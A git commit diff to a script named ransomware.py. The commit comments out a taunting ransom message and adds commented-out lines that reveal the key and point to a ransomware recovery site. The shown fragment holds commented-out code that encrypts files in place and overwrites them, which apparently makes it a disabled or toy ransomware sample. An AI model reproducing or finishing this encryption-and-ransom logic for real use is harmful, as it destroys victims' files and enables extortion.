d9c511f26c6f299aabbc5d2f0a6bd6e28b441b5f
GdevMan <yasenbiv66@gmail.com>
2025-11-20 19:10:50 +0200

    Comment out ransomware messages and input prompt
    Also added a few things

--- ransomware.py
+++ ransomware.py
@@ -20,5 +20,8 @@
 #        encrypted = f.encrypt(things.encode())
 #    with open(i, "w") as f:
 #        f.write(encrypted)
-print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
-print(f'Encrypted files: {files}')"""
+#print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
+#print(f'Encrypted files: {files}')
+#print(f'By the way key to unlock your files is: {key}. To learn how to use it go to https://www.nomoreransom.org/en/index.html')
+#input() #Pause
+"""
